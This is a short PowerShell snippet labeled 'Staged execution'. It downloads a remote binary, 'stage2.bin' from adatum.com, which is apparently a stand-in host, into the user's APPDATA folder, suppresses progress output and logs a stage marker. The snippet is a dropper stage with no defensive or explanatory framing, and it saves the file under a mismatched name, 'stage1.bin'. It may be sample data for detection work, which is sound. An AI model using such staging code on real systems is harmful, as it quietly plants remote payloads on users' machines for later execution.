
<# Staged execution #> $RemoteUrl = 'http://adatum.com/cdn/stage2.bin'; $WorkingPath = "$env:APPDATA\stage1.bin"; Invoke-WebRequest -Uri $RemoteUrl -OutFile $WorkingPath -UseBasicParsing; $ProgressPreference = "SilentlyContinue"; Write-Verbose "stage marker 6 reached"
